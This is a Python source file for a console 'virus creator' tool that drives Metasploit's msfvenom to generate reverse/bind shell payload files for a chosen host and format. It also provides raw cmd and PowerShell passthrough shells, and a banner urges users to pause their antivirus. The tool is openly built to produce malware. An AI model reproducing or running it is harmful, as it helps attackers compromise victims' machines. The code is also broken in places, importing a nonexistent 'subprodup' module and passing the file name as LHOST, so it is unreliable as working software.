import os
import sys
import zipfile
import subprodup
import socket
import subprocess
from logo import showlogo
import colorama
import colorsys
import patoolib
from termcolor import cprint
from pyunpack import Archive

colorama.init()

VirusCreatorFolder = "c:/Program Files/Virus-Creator-Py/"
componentsFolder = "c:/Program Files/Virus-Creator-Py/components/"
payloadFile = "c:/Program Files/Virus-Creator-Py/components/payloads.txt"
formatFile = "c:/Program Files/Virus-Creator-Py/components/formats.txt"
pathDataFile = "c:/Program Files/Virus-Creator-Py/components/pathData.txt"
licenseFile = "c:/Program Files/Virus-Creator-Py/components/license.txt"


def makeFolder():
    if os.path.exists(VirusCreatorFolder) == False:
        os.system("c: && cd/ && cd Program Files && mkdir Virus-Creator-Py")
        os.system("c: && cd/ && cd Program Files/Virus-Creator-Py && mkdir components")


if os.path.exists(VirusCreatorFolder) == False:
    print("Please wait... This is one time setup so please be patient")
if os.path.exists(VirusCreatorFolder):
    metasInTOF = input("Do you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "y":
        if os.path.exists(pathDataFile):
            pathData = open(pathDataFile).read()
        else:
            cprint("""
            Don't install metasploit in folder if the metasploit-framework folder is in a folder 
            please cut and paste it outside the folder
            """, "red", attrs=["bold"])
            cprint("Please don't add '/' or '\' at last..","red")
            pathto = input("In which drive you installed metasploit>>")
            if os.path.exists(f"{pathto}/metasploit-framework"):
                pathD = open(pathDataFile, "w").write(pathto)
                pathData = open(pathDataFile).read()
            else:
                print("PATH NOT FOUND! Either the path doesn't exist or you may installed it in a folder")
else:
    makeFolder()

    metasInTOF = input("Do you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "y":
        if os.path.exists(pathDataFile):
            pathData = open(pathDataFile).read()
        else:
            cprint("""
               Don't install metasploit in folder if the metasploit-framework folder is in a folder 
               please cut and paste it outside the folder
              """, "red", attrs=["bold"])
            cprint("Please don't add '/' or '\' at last..", "red")
            pathto = input("In which drive you installed metasploit>>")
            if os.path.exists(f"{pathto}/metasploit-framework"):
                pathD = open(pathDataFile, "w").write(pathto)
                pathData = open(pathDataFile).read()
            else:
                print("PATH NOT FOUND! Either the path doesn't exist or you may installed it in a folder")

    elif metasInTOF.lower() == "n":
        if os.path.exists(f"{componentsFolder}metasploitframework-latest.msi"):
            os.system("c:&&cd/&&cd Program Files/Virus-Creator-Py/components && metasploitframework-latest.msi")
        else:
            cprint("DON'T INSTALL METASPLOIT IN FOLDER........It will automaically create a folder and install it","red",attrs=["bold"])
            os.system(
                f"c:&&cd/&&cd Users/{os.getlogin()}/Downloads&&curl https://windows.metasploit.com/metasploitframework-latest.msi --output c:/Program Files/Virus-Creator-Py/components/&&c:&&cd/&&cd Program Files/Virus-Creator-Py/components/&&metasploitframework-latest.msi")
            instFin = input("Please type 'Y' if the installation is complete>>")
            if instFin.lower() == "y":
                if os.path.exists("c:/Program Files/Virus-Creator-Py/components/pathData.txt"):
                    pathto = open("c:/Program Files/Virus-Creator-Py/components/pathData.txt").read()
                else:
                    cprint("Please don't add '/' or '\' at last..","red")
                    pathtof = input("please type the drive you installed>> ")
                    fileCreate = open("c:/Program Files/Virus-Creator-Py/components/pathData.txt", "w").write(pathtof)
                    pathto = open("c:/Program Files/Virus-Creator-Py/components/pathData.txt").read()
    else:
        cprint(f"Unexpected command: {metasInTOF}.    exiting..", "red")
        sys.exit(2)

    if os.path.exists(payloadFile):
        payloadList = open(payloadFile).read()
    else:
        cprint("please wait.... creating some components please be patient this is only one time process", "red")
        payloadF = open(payloadFile, "w").write(
            subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                   shell=True).decode("utf-8"))
        payloadList = open(payloadFile).read()

    if os.path.exists(formatFile):
        formatList = open(formatFile).read()
    else:
        formatF = open(formatFile, "w").write(
            subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                   shell=True).decode("utf-8"))
        formatList = open(formatFile).read()


def showInput():
    cprint("type 'help' to print a help message", "green", attrs=["bold"])
    platformPayload = input("payload>> ")
    if platformPayload == "lsp":
        if os.path.exists("c:/Program Files/Virus-Creator-Py/components/payloads.txt"):
            payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt").read()
        else:
            payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt", "w")
            payloadList.write(
                subprodup.check_output(f"cd {pathto}&&msfvenom --list payloads", shell=True).decode("utf-8"))
            payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt").read()
        print(payloadList)
    elif platformPayload == "swd":
        print("Your current working directory is: "+os.getcwd())
    elif platformPayload == "show-ip":
        cprint(f"Your current ip address is: '{socket.gethostbyname(socket.gethostname())}'")
    elif platformPayload == "enter-cmd":
        cmd()
    elif platformPayload == "remove-virus-creator":
        cprint("Uninstalling Virus-Creator")
        metRemoveConF = input("Do you want to remove metasploit? [Y/N]")
        if metRemoveConF.lower() == "y":
            cprint("""
                          Don't install metasploit in folder if the metasploit-framework folder is in a folder 
                          please cut and paste it outside the folder
                         """, "red", attrs=["bold"])
            pathtomsf = input("please type the driver you installed metasploit>>")
            runps(f"{pathtomsf}&&cd/&&cd metasploit-framework/bin&&msfremove")
        if os.path.exists("c:/Program Files/Virus-Creator-Py"):
            os.system("c:&&cd/&&cd Program Files&&rmdir /s /q Virus-Creator-Py")
    elif platformPayload == "clear-data":

        if os.path.exists("c:/Program Files/Virus-Creator-Py"):
            os.system("c:&&cd/&&cd Program Files&&rmdir /s /q Virus-Creator-Py")
    elif platformPayload == "enter-ps1":
        ps1()
    elif platformPayload == "lsf":
        if os.path.exists(formatFile):
            formatList = open(formatFile).read()
        else:
            formatF = open(formatFile, "w").write(
                subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                       shell=True).decode("utf-8"))
            formatList = open(formatFile).read()
        print(formatList)
    elif platformPayload == "help":
        cprint(
            "                                                                   Available Commands                                                                               ",
            "green", None, attrs=["underline"])
        cprint("""
      enter-cmd    to enter cmd command line where you can type cmd commands 
      swd          shows you the current working directory
      enter-ps1    to enter ps1 (powershell) command line where you can type ps1 commands  
      remove-virus-creator   deletes files created by virus creator
      clear-data    deletes all data files        
      lsp           list all payloads
      show-ip       shows your ip-address
      help          shows this message

      How to create a payload?
          first to create payload type 'lsp' command so you can see a list of payloads
          then copy the payload you need to make
          then paste the copied payload eg:  windows/x64/shell/bind_ipv6_tcp
          then type your ip address if you don't know your ip address you can type 'show-ip' command so you can see your ip-address
          then type the name you want to give to your malware file OR file infected with this payload
                   ....BE CARFULL WITH IT....
          .. 
                """, "green", attrs=["bold"])

    if os.path.exists("c:/Program Files/Virus-Creator-Py/components/payloads.txt"):
        payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt").read()
    if os.path.exists("c:/Program Files/Virus-Creator-Py/components/payloads.txt") == False:
        payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt", "w")
        payloadList.write(
            subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list payloads",
                                   shell=True).decode("utf-8"))
        payloadList = open("c:/Program Files/Virus-Creator-Py/components/payloads.txt").read()

    elif platformPayload in payloadList:
        if platformPayload != "swd" and platformPayload != "enter-cmd" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip":
            cprint("      Type my-ip to automatically check your ip address and submit the ip address", "green", None,
                   attrs=["bold"])
            ipaddressU = input("Please type the ipaddress>> ")
            if ipaddressU != "my-ip":
                if os.path.exists("c:/Program Files/Virus-Creator-Py/components/formats.txt"):
                    f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                    formatList = f

                else:
                    f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt", "w")
                    cprint("Please be patient a 2 more components to load", "red")
                    f.write(
                        subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                               shell=True).decode("utf-8"))
                    formatList = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                name = input("name of the file you need to name your virus>>")
                formatPayload = input("please type your format>>")
                if formatPayload != "lsf":
                    if formatPayload in formatList:
                        os.system(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                        mainPath = os.path.join(pathData,"metasploit-framework/bin")
                        mixPath = os.path.join(mainPath,name)
                        makedirandmovefile(mixPath, formatPayload)
                    else:
                        cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                        while formatPayload not in formatList:
                            if os.path.exists("c:/Program Files/Virus-Creator-Py/components/formats.txt"):
                                f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                                formatList = f

                            else:
                                f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt", "w")
                                cprint("Please be patient a 2 more components to load", "red")
                                f.write(
                                    subprodup.check_output(
                                        f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                        shell=True).decode("utf-8"))
                                formatList = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                            formatPayload = input("please type your format>>")
                            if formatPayload in formatList:
                                name = input("name of the file you need to name your virus>>")
                                os.system(
                                    f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                mixPath = os.path.join(mainPath, name)
                                makedirandmovefile(mixPath, formatPayload)
                            else:
                                cprint("Invalid format please type lsf to list all formats", "red", None,
                                       attrs=["bold"])
                else:
                    print(formatList)

            else:
                cprint(f"Your ip will be {socket.gethostbyname(socket.gethostname())}", "green")
                if os.path.exists("c:/Program Files/Virus-Creator-Py/components/formats.txt"):
                    f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                    formatList = f

                else:
                    f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt", "w")
                    cprint("Please be patient a 2 more components to load", "red")
                    f.write(
                        subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                               shell=True).decode("utf-8"))
                    formatList = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                formatPayload = input("please type your format>>")
                if formatPayload in formatList:
                    name = input("name of the file you need to name your virus>>")
                    os.system(
                        f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                    mainPath = os.path.join(pathData, "metasploit-framework/bin")
                    mixPath = os.path.join(mainPath, name)
                    makedirandmovefile(mixPath, formatPayload)
                else:
                    if formatPayload == "lsf":
                        print(formatList)
                    else:
                        cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                    while formatPayload not in formatList:
                        if os.path.exists("c:/Program Files/Virus-Creator-Py/components/formats.txt"):
                            f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                            formatList = f

                        else:
                            f = open("c:/Program Files/Virus-Creator-Py/components/formats.txt", "w")
                            cprint("Please be patient a 2 more components to load", "red")
                            f.write(
                                subprodup.check_output(
                                    f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                    shell=True).decode("utf-8"))
                            formatList = open("c:/Program Files/Virus-Creator-Py/components/formats.txt").read()
                        formatPayload = input("please type your format>>")
                        if formatPayload in formatList:
                            name = input("name of the file you need to name your virus>>")
                            os.system(
                                f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                            mainPath = os.path.join(pathData, "metasploit-framework/bin")
                            mixPath = os.path.join(mainPath, name)
                            makedirandmovefile(mixPath, formatPayload)
                        else:
                            cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
    else:
        if platformPayload != "swd" and platformPayload != "enter-cmd" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip":
            cprint("Unknown command or payload please type lsp to list all payloads", "red", None, attrs=["bold"])


def cmd():
    cprint("Type 'exit-cmd' command to exit", "green", None, attrs=["bold"])
    bash = input(">> ")
    if bash != "exit-cmd":
        output = subprodup.check_output(bash, shell=True)
        if ": not found" in output.decode("utf-8"):
            print("Invalid Command")
        else:
            print(output.decode("utf-8"))
        if bash != "exit-cmd":
            bash = input(">> ")
            while bash != "exit-cmd":
                bash = input(">>")
                output = subprodup.check_output(bash, shell=True)
                if ": not found" in output.decode("utf-8"):
                    print("Invalid Command")
                elif bash != "exit-cmd":
                    print(output.decode("utf-8"))


def makedirandmovefile(nameofFile, formatType):
    cprint("""
    Where do you want to move the file to existing folder or create new folder

    1) I want to move to a existing folder
    2) I want to create a new folder and move the file

    """, "green", attrs=["bold"])
    confirmToExistingOrNew = input("number>> ")
    if confirmToExistingOrNew == "2":
        cprint(
            "Type the path you need to move the file first type the drive you need to create the folder and press ENTER then type the folder name you need to create",
            "green", attrs=["bold"])
        path = input("path>> ")
        nameoffolder = input("folder-name>> ")
        os.mkdir(os.path.join(path, nameoffolder))
        createdPath = path + "/" + nameoffolder
        nameofFileMixed = nameofFile + "." + formatType
        os.system(f"cd/&&move {nameofFileMixed} {createdPath}")
    elif confirmToExistingOrNew == "1":
        existingPath = input("path>> ")
        nameofFileMixed = nameofFile + "." + formatType
        os.system(f"cd/&&move {nameofFileMixed} {existingPath}")
    else:
        cprint("Invalid Command", "red", attrs=["bold"])
        while confirmToExistingOrNew != "1" and confirmToExistingOrNew != "2":
            cprint("""
            Where do you want to move the file to existing folder or create new folder

            1) I want to move to a existing folder
            2) I want to create a new folder and move the file

            """, "green", attrs=["bold"])
            confirmToExistingOrNew = input("number>>")
            if confirmToExistingOrNew == "2":
                cprint(
                    "Type the path you need to move the file first type the path and press ENTER then type the folder name you need to create",
                    "green", attrs=["bold"])
                path = input("path>> ")
                nameoffolder = input("folder-name>> ")
                os.mkdir(path)
                createdPath = path + "/" + nameoffolder
                nameofFileMixed = nameofFile + "." + formatType
                os.system(f"cd/&&move {nameofFileMixed} {createdPath}")
            elif confirmToExistingOrNew == "1":
                existingPath = input("path>> ")
                nameofFileMixed = nameofFile + "." + formatType
                os.system(f"cd/&&move {nameofFileMixed} {existingPath}")
            else:
                cprint("Invalid Command", "red", attrs=["bold"])


def installMetasploit():
    metasInTOF = input("Doo you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "n":
        if os.path.exists(f"c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi"):
            runps(f'& "c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi"')
        else:
            if os.path.exists(f"d:/metasploitframework-latest.msi"):
                runps(f'& "d:/metasploitframework-latest.msi"')
            runps("")
            runps(f"c:/Users/{os.getlogin()}/Downloads/metasploitframework-latest.msi")
    else:
        pathto = input("please type the path you installed>> ")
        if os.path.exists(pathto):
            os.system(f"cd {pathto}")


def ps1():
    cprint("Type 'exit-bash' command to exit", "green", None, attrs=["bold"])
    ps = input(">> ")
    if ps != "exit-ps1":
        subprocess.run(["powershell", "-Command", ps])
        if ps != "exit-ps1":
            ps = input(">> ")
            while ps != "exit-ps1":
                ps = input(">> ")
                subprocess.run(["powershell", "-Command", ps])


import ctypes, os


def isAdmin():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0  # elese if Windows
    return is_admin


def unzip(pathToFile, destinationPath):
    with zipfile.ZipFile(pathToFile, 'r') as zip_ref:
        zip_ref.extractall(destinationPath)


def unrar(pathtoFile, dest):
    patoolib.extract_archive(pathtoFile, outdir=dest)

def prntLicense():
    cprint(""" 
                      License Agreement of this Program
                     ====================================
                           Created by AbdulWahab
                           *********************
                              With Metasploit

                      This app is created with metasploit
    =========================================================================
                        License Agreement Of metasploit
                      ==================================
                      Copyright (C) 2006-2015, Rapid7, Inc.

                THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
                CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
                INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
                MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
                DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
                CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
                INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
                (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
                GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
                BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
                LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
                (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
                OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
                POSSIBILITY OF SUCH DAMAGE.

                ========================================================

                The Metasploit Framework is provided under the 3-clause
                BSD license above.

                The copyright on this package is held by Rapid7, Inc.

                This license does not apply to several components within
                the Metasploit Framework source tree.  For more details
                see the LICENSE file at
                https://github.com/rapid7/metasploit-       
        """, "cyan", attrs=["bold"])
def prntImportantText():
    cprint("""              
                               ********************************************************************************************
                               *                    ***PLEASE READ THIS IT IS IMPORTANT***                                *
                               *                                                                                          *
                               *                       PLEASE PAUSE YOUR ANTIVIRUS                                        *  
                               *                     =================================                                    *
                               *   Your antivirus maybe detecting alot viruses BUT I PROMISE YOU THIS IS NOT VIRUS        *  
                               *  BUT IT ALLOWS YOU TO CREATE VIRUS THIS APP CONTAINS VIRUSES WON'T HARM YOU...           *
                               *      BUT AFTER YOU MADE THE VIRUS THEN IF YOU RUN THAT EXECUTABLE FILE IT WILL HARM YOU  *
                               *              ********************************************                                * 
                               *           SO DON'T RUN THE RESULTED FILE OR THE MALWARE YOU MADE                         * 
                               *         ON YOUR COMPUTER WHICH CAN CAUSE TO SECURITY VULNERABILITIES                     *
                               ********************************************************************************************
                              """, "cyan", attrs=["bold"])
def start():
    if os.path.exists(licenseFile):
        if open(licenseFile).read()=="n":
            cprint("Sorry! You nee accept license agreements....", "red", attrs=["bold"])
            sys.exit(2)
        else:
            cprint("starting friendly virus creator....", "green", attrs=["bold"])
            showlogo.showIntroLogo()
            if os.path.exists(licenseFile):
                licenseData = open(licenseFile).read()
            else:
                prntLicense()
                agr = input("Do you agree to the license agreement? [Y/N]")
                if agr.lower() == "y":
                    licen = open(licenseFile,"w").write("y")
                    licenceData =open(licenseFile).read()
                elif agr.lower() == "n":
                    licen = open(licenseFile, "w").write("n")
                    licenceData = open(licenseFile).read()
                if licenceData =="y":
                    prntImportantText()
                    while True:
                        showInput()
                else:
                    cprint("Sorry! You nee accept license agreements....","red",attrs=["bold"])
                    sys.exit(2)
    else:
        cprint("starting friendly virus creator....", "green", attrs=["bold"])
        showlogo.showIntroLogo()
        if os.path.exists(licenseFile):
            licenseData = open(licenseFile).read()
        else:
            prntLicense()
            agr = input("Do you agree to the license agreement? [Y/N]")
            if agr.lower() == "y":
                licen = open(licenseFile, "w").write("y")
                licenceData = open(licenseFile).read()
            elif agr.lower() == "n":
                licen = open(licenseFile, "w").write("n")
                licenceData = open(licenseFile).read()
            if licenceData == "y":
                prntImportantText()
                while True:
                    showInput()
            else:
                cprint("Sorry! You nee accept license agreements....", "red", attrs=["bold"])
                sys.exit(2)



def runps(cmd, outputCapture=False):
    subprocess.run(["powershell", "-Command", cmd], capture_output=outputCapture)


start()



